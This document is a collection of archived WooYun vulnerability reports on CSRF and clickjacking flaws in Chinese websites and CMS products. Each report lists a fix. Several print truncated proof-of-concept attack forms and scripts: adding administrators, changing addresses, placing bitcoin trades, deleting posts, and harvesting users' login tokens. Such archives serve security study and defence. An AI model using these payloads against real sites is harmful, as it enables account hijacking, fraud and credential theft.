### [wooyun-2011-02161] 人人网GET方式提交状态漏洞
**厂商**: 人人网 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 暗恋：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 将GET方式改为POST方式
---

---
### [wooyun-2015-0121174] 利用CSRF漏洞劫持会员账号
**厂商**: 贝贝网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 首先我们先让用户中招绑定上我的某邮箱服务，我写了一个SCRF。代码如下：<html><head><title>scr poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40某域名.com"></fo

**绕过**: 直接利用

**修复**: 修复一下CSRF吧。
---

---
### [wooyun-2015-0163147] 爱卡汽车两处问题(绑定账号与任意解绑定)
**厂商**: 爱卡汽车网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题1：账号注入后，绑定OAuth时，无token验证，存在csrf。而且此处应加入state参数。相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。问题2：手机解除绑定操作可以被暴力破解，添加验证码解决。

**POC**: 问题1证明：无token或者state保护，存在csrf。问题2证明：解绑定手机无验证码判断，存在暴力破解问题

**绕过**: 直接利用

**修复**: 漏洞1：相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。具体修复参考漏洞2：添加提交code时的验证码检查功能
---

---
### [wooyun-2015-092034] 主机屋CSRF更改域名管理密码
**厂商**: 主机屋 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 更改新密码无需验证旧密码。csrf即可形成

**POC**: 抓包截图 构造csrf表单

**绕过**: 直接利用

**修复**: 更改新密码时需要验证旧密码。
---

---
### [wooyun-2013-038432] 某论坛系统配置不当可导致CSRF发帖
**厂商**: 某论坛系统 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: crossdomain.xml的默认设置：<?xml version="1.0"?>-<cross-domain-policy> <allow-access-from domain="*"/><!-- flash跨域策略，domain建议设置为 *.你的站点域名 --></cross-domain-policy>虽然有建议 但是普通站长谁没事改这个啊，还不如你们在安装时直接根据host重写下crossdomain.xml得了。先取到csrf的tokenfunction gethash() {function getformhash(txt) {txt = txt.split('csrf_token" value="')[1].split('"')[0];return txt;}var result_lv:LoadVars = new LoadVars();result_lv.onData 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删了那个文件吧，或者重写吧，千万不要让他站在敌人的那一边。
---

---
### [wooyun-2015-0124911] 本来生活网 csrf一枚
**厂商**: 本来生活网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录账户A，修改其收货地址，并抓包查看其收货地址，修改成功：请求为post，且参数可预测，尝试csrf。构造连接，主要代码;xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("checkNeighbor=0&AddressCount=2&sysno=1898189&txtBrief=jia1&province=1&city=2&district=10&txtStreet=fgdsgtesghth&txtZip=100000&txtName=woo&

**POC**: 同上

**绕过**: 直接利用

**修复**: token验证refer
---

---
### [wooyun-2014-054891] 酷6-开心 OAuth 2.0 redirect_uir CSRF漏洞
**厂商**: 酷6网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 酷6-开心 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个酷6-开心OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1. 建议采取有效措施去抵抗针对OAuth 2.0 redirect_uir 的CSRF攻击。比如：a. 强制用户重新输入帐号密码，然后再进行绑定操作。这是最简单有效的方式。但可能会牺牲用户体验。b. 酷6网可以采用验证referer的值来抵抗针对OAuth 2.0 redirect_uir 的CS
---

---
### [wooyun-2013-028259] 汽车之家论坛csrf刷粉丝漏洞(绕过图片src限制)
**厂商**: 汽车之家 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 分析加关注请求，是POST请求2.用GET方式尝试下，发现用的是$_REQUEST GET方式同样可以请求，那么就可以找个位置CSRF了，理想的位置就是帖子页面。3. 帖子回复插入img src为https://example.com/[已脱敏] 发现被处理了，然后插入表情图片 可以正常显示，慢慢琢磨，发现img src没有带图片后缀的会被过滤。4. 绕过图片src限制构造，加个a=a.gif https://example.com/[已脱敏] 达到同样的加粉效果。

**POC**: 一个帖子带来的粉丝一晚上超过一百哈~

**绕过**: 过滤绕过

**修复**: $_REQUEST 这个可以构造csrf的太多了。等下再用这个图片洞蠕动下，
---

---
### [wooyun-2012-013213] 豆瓣说分享页面 点击劫持
**厂商**: 豆瓣 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不少互联网厂商都有存在这个问题,9月的时候有同学写过一篇日志详细描述了这个问题：https://example.com/[已脱敏]

**POC**: 测试豆瓣的~ chrome下测试点了就中招了哦https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 人人网 和 某社交平台某社交平台的解决方案是检测被嵌套frame后跳转，但是看Google、Twitter、Facebook都是通过 [X-Frame-Options](https://example.com/[已脱敏] ) 解决的。具体 Google
---

---
### [wooyun-2015-0116242] 对外经济贸易大学能源监控平台
**厂商**: 对外经济贸易大学 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏]admin123456

**POC**: (见原文)

**绕过**: 直接利用

**修复**: Null；
---

---
### [wooyun-2012-012568] 鲜果网某处CSRF漏洞可蔓延蠕虫
**厂商**: 鲜果网 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。演示地址：https://example.com/[已脱敏] (用户名/密码：imlonghao)登录状态下访问，会自动发一条名为Hello World的某社交平台，并会关注一个用户。

**POC**: 【加关注】漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="beingsIds" value="1378148" /><input type="text" name="parentId" value="0" /><input type="text" name="ftype" value="0" /></form>

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2014-055782] PHPOK CSRF获取管理员权限
**厂商**: phpok.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PHPOK CSRF获取管理员权限

**POC**: 测试环境（PHPOK）：添加用户：抓包抓到如下内容：POST /phpok/admin.php?c=admin&f=save HTTP/1.1Host: www.evil.comProxy-Connection: keep-aliveContent-Length: 67Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 6.1; WO

**绕过**: 直接利用

**修复**: 1. 判断referer来源，根据业务的逻辑进行referer的过滤。2. 添加一次性token，同时注意随机不可预测性！
---

---
### [wooyun-2012-013803] sohu邮箱csrf，可以窃取用户邮件及修改用户信息等
**厂商**: 某门户网站 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: sohu邮箱基本未做csrf防御，只要发送一封html邮件给用户，用户要是点了里面的链接，任人折腾了哦。。问题存在多处，我就随便拿一处举例了。在证明中，我把用户的所有邮件转发垤指定的邮箱中去，这破坏超大吧?

**POC**: 发封html邮件给要攻击的人因为sohu只认post请求，所以构建一个外站链接，由外站发起post请求点了邮件中的链接后来看看外站内容bingo! 战果

**绕过**: 直接利用

**修复**: csrf常规处理了，你们会的。 如果改动比较大，那起码检测一下referer。
---

---
### [wooyun-2014-085436] 某搜索引擎某接口鉴权不严格可跨域获取用户彩票站登录凭据
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 话说在某搜索引擎首页有个某搜索引擎乐彩的选项卡。点击刷余额，会发出一条如下的异步请求。然后，这个请求精简一下，那些看上去进行鉴权的参数都去掉。得到下面的网址。（这些参数也只是看上去好像用来鉴权，其实根本没用起来）https://example.com/[已脱敏]"errNo": "0","id": "10","data": {"balance": "0元","prizeinfo": {"count": "0","url": "https://example.com/[已脱敏]"},"toke

**POC**: 要证明吗？那就在自己网站上挂个JS代码吧。专业收集访客的单点登录地址。等我多收集一点再来证明吧。<script type="text/javascript">var url = 'https://example.com/[已脱敏]';$.getJSON(url,function(json) {var bd_info = json.data.token.bd_info;var bd_bind = json.data.token.bd_bind;var bd_sign = json.data.token.bd

**绕过**: 直接利用

**修复**: 验证严格一点就OK啦~~
---

---
### [wooyun-2014-071789] 某手机厂商商城某处CSRF可修改安全邮箱
**厂商**: 某通信设备厂商 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 此问题和去年的某手机厂商商城的漏洞https://example.com/[已脱敏]

**POC**: 原账户安全邮箱没有添加：直接GET方式请求：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 老问题了。。。
---

---
### [wooyun-2015-0110198] 某体育社区URL跳转+CSRF可以任意水帖
**厂商**: 某体育社区体育网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL跳转:go.hupu.com/u?url=CSRF:bbs回帖处  无token,无referer判断所以https://example.com/[已脱敏] 可能更有欺骗性

**POC**: <div id="bodyframe" style="VISIBILITY: hidden"><form id="fastform" name="FORM" class="j_atc_content left" method="post" action="https://example.com/[已脱敏]" onsubmit="textConvert('fastform', 'atc_content')"><!--回复框--><div id="re" class="box"><div id="re_top"></div><div id="re_box"><div class="left

**绕过**: 直接利用

**修复**: 加token判断referer
---

---
### [wooyun-2014-077794] 火币网买卖比特币模拟交易CSRF漏洞
**厂商**: huobi.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>CSRF Hijack</title></head><body><form id="form_add_buy_btc" class="form-horizontal" method="post" action="https://example.com/[已脱敏]"><div class="control-group"><label class="control-label tx-red" for="zuijiamaijia">最佳买价：</label><div class="controls"><label id="zuijiamaijia" class="tx-red" onclick="$('#form_add_buy_btc #mairujia'

**POC**: 之前的状态：漏洞表单：提交表单后跳转到火币网页面并成功扣除余额：

**绕过**: 直接利用

**修复**: 建议为每笔交易加上token或者验证，因为正式场景下也并没有任何验证，如果恶意页面和火币网页面一起打开并且用户登录了火币网则后果不堪设想
---

---
### [wooyun-2015-0158014] 酷派商城CSRF劫持收货地址
**厂商**: yulong.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="addressId" value="" /><input type="hidden" name="receiver" value="test" /><input type="hidden" name="province" value="373" /><input type="hidden" name="city" value="375" /><input type="hidden" name="district" value="404" /><input type="hidden" name="address" value

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0148420] 堆糖csrf可修改个人信息
**厂商**: 堆糖信息科技（上海）有限公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改个人信息的地方，存在csrf

**POC**: PoC:<html><form action="https://example.com/[已脱敏]" method=post><input type=text value="aaaaaaaa" name="name" /><input type=text value="15888888888" name="mobile" /><input type=text value="" name="citycode" /><input type=text value="" name="cityname" /><input type=text value

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2013-017294] 我是如何绕过某社交平台某社交平台防御继续刷粉丝的
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.我这里会说2个case，从最严重的开始吧！2.出问题的站点是某社交平台媒体，看这里：https://example.com/[已脱敏]

**POC**: 1.后面这个case和上面阐述的一样啦，大家可以略过了撒！2.某社交平台又个频道叫着微刊：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1.关键请求还是改成post比较好！2.关键请求还是加token比较好！3.礼物啊礼物！年底各种忙，还不忘给某社交平台找洞，要鼓励这种舍己为人的精神啊！
---

---
### [wooyun-2015-0159397] 通过制作post请求可以对用户的文章进行删除
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该博客在对文章进行删除时，将文章id作为一个参数发出请求，所以第三方可以在用户没有关闭浏览器的这一段时间，制作post请求删除已知id的文章。

**POC**: <html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="ids" value="310832966" /><input type="submit" value="Submit request" /></form></body></html>在用户flyniuniu登录过程中（关闭浏览器之前）构造此post请求，点击button，便可以把id为310832966的文章删除。

**绕过**: 直接利用

**修复**: 可以利用简单服务器端验证码，或是token验证解决
---

---
### [wooyun-2014-065964] ESPCMS通过csrf添加管理员
**厂商**: 易思ESPCMS企业网站管理系统 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POST /adminsoft/index.php?archive=management&action=managesava HTTP/1.1Host: [IP已脱敏]Proxy-Connection: keep-aliveContent-Length: 127Accept: */*X-Requested-With: XMLHttpRequestOrigin: http://[IP已脱敏]User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/[IP已脱敏]0 Chrome/30.0.1599.101 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept-Encodi

**POC**: <html><div style="display:none"><form action="http://[IP已脱敏] id="poc" name="poc" method="post"><input type="hidden" name="inputclass" value=""/><input type="hidden" name="tab" value=""/><input type="hidden" name="username" value=""/><input 

**绕过**: 直接利用

**修复**: 增加来源的或者token的检查吧。
---
